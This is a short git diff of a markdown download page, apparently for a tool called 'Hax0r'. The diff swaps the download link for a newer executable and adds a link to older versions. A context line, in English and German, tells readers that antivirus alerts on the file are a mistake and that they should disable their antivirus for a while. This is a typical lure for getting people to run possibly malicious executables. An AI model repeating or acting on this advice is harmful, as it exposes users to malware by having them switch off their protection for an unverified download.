@@ -19,11 +19,13 @@ Your anti-virus might detect this file as a virus, but this is a mistake. If thi
 Dein AntiVirus könnte diese Datei als Virus erkennen, Dies ist aber ein Fehler. Wenn dies der Fall sein sollte, deaktiviere kurzzeitig dein Antivirus.
 ```
 
-## Download B1
+## Download B2
 
 
-[Download Now](https://github.com/tutorian/iTuto/releases/download/Hax0r/Hax0r.exe)
+[Download Now](https://github.com/tutorian/iTuto/releases/download/Hax0rb2/Hax0r_b2.exe)
 
-
+```markdown
+[Old Versions](https://github.com/tutorian/iTuto/releases)
+```
 
 [Go back](https://tutorian.github.io/iTuto)
